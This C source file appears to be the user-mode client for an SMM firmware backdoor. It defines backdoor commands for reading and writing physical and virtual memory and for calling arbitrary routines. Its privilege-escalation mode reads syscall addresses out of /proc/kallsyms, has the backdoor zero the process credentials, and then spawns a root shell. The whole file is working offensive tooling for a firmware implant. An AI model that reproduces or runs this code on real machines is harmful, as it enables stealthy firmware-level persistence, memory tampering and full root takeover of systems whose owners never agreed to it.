#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <string.h>
#include <inttypes.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/mman.h>

#define MAX_COMMAND_LEN 0x200

#define BACKDOOR_PING               0 // test for alive SMM backdoor
#define BACKDOOR_READ_PHYS_MEM      1 // read physical memory command
#define BACKDOOR_READ_VIRT_MEM      2 // read virtual memory command
#define BACKDOOR_WRITE_PHYS_MEM     3 // write physical memory command
#define BACKDOOR_WRITE_VIRT_MEM     4 // write virtual memory command
#define BACKDOOR_TIMER_ENABLE       5 // enable periodic timer handler
#define BACKDOOR_TIMER_DISABLE      6 // disable periodic timer handler
#define BACKDOOR_CALL               7 // call specified subroutine
#define BACKDOOR_PRIVESC            8 // set uid/gid/euid/egid of current process to 0

// external function implemented in assembly
extern int smm_call(long code, unsigned long long arg1, unsigned long long arg2);

int main(int argc, char *argv[])
{
    int ret = 0;    
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(0, &mask);

    // tells to the scheduler to run current process only on first CPU
    ret = sched_setaffinity(0, sizeof(mask), &mask);
    if (ret != 0)
    {
        printf("sched_setaffinity() ERROR %d\n", errno);
        return errno; 
    }

    if (argc >= 2 && !strcmp(argv[1], "--privesc"))
    {
        /*
            Privileges escalation mode.
        */

        if (argc >= 3)
        {
            int i = 0;            

            for (i = 2; i < argc; i += 2)
            {
                unsigned long long addr = 0;
                char *func = argv[i + 1];

                // parse syscall address that was passed to the program by itself using cat + grep
                if ((addr = strtoull(argv[i], NULL, 16)) == 0 && errno == EINVAL)
                {
                    printf("strtoull() ERROR %d\n", errno);
                    return errno; 
                }

                if (addr == 0)
                {
                    printf("ERROR: Unable to resolve %s() address\n", func);
                    return EINVAL;
                }

                printf("%s() address is 0x%llx...\n", func, addr);            

                // call target code to be sure that it's not swapped out
                getuid();
                getgid();
                geteuid();            
                getegid();

                // ask the backdoor to set cred field value to 0
                ret = smm_call(BACKDOOR_PRIVESC, addr, 0);

                if (ret != 0)
                {
                    printf("ERROR: Backdoor returns 0x%x\n", ret);
                    return ret;
                }
            }            

            // check for root privileges
            if (getuid() == 0 && geteuid() == 0 &&
                getgid() == 0 && getegid() == 0)
            {
                printf("SUCCESS\n");

                // run command shell
                execl("/bin/sh", "sh", NULL);
            } 
            else
            {
                printf("FAILS\n");
                return EINVAL;
            }
        }
        else
        {            
            int i = 0, code = 0;
            char command[MAX_COMMAND_LEN];

            /* 
                Find desired syscalls addresses in /proc/kallsyms and pass them 
                to the same program as command line arguments.
            */

            char *functions[] = { "sys_getuid", "sys_geteuid", 
                                  "sys_getgid", "sys_getegid", NULL };                                              

            printf("Getting root...\n");

            sprintf(command, "%s --privesc ", argv[0]);

            for (i = 0; functions[i]; i++)
            {
                char *func = functions[i];            

                sprintf(
                    command + strlen(command), 
                    "0x`cat /proc/kallsyms | grep '%s$' | awk '{print $1}'` %s ", func, func
                );                
            }     

            code = system(command);
            if (code != 0)
            {
                printf("ERROR: Command \"%s\" returns 0x%x\n", command, code);
                return code;
            }       
        }
    }
    else
    {
        int code = 0;
        unsigned long long arg1 = 0, arg2 = 0;

        /*
            Parse arguments for SMM backdoor call from command line arguments.
        */

        if (argc >= 2)
        {
            if ((code = strtol(argv[1], NULL, 16)) == 0 && errno == EINVAL)
            {
                printf("strtol() ERROR %d\n", errno);
                return errno; 
            }
        }

        if (argc >= 3)
        {
            if ((arg1 = strtoull(argv[2], NULL, 16)) == 0 && errno == EINVAL)
            {
                printf("strtoull() ERROR %d\n", errno);
                return errno; 
            }
        }

        if (argc >= 4)
        {
            if ((arg2 = strtoull(argv[3], NULL, 16)) == 0 && errno == EINVAL)
            {
                printf("strtoull() ERROR %d\n", errno);
                return errno; 
            }
        }    

        printf(
            "Calling SMM backdoor with code = 0x%x and args 0x%llx, 0x%llx...\n", 
            code, arg1, arg2
        );

        ret = smm_call(code, arg1, arg2);

        printf("Sucess! Status code: 0x%.8x\n", ret);
    }

    return ret;
}
